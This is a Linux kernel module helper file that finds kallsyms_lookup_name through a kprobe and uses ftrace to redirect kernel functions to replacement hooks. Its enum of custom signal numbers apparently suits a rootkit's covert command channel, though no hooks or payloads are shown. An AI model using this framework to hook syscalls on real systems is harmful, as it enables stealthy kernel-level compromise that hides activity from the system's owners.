#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif


enum {
	SIG1 = 60,
	SIG2 = 61,
	SIG3 = 62,
	SIG4 = 63,
	SIG5 = 64,
	SIG6 = 55,
	SIG7 = 56,
	SIG8 = 57,
	SIG9 = 58,
	SIG10 = 59,
	SIG11 = 31,
};

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};


static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "hooking: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;

}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "hooking: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "hooking: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}


void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "hooking: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "hooking: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}
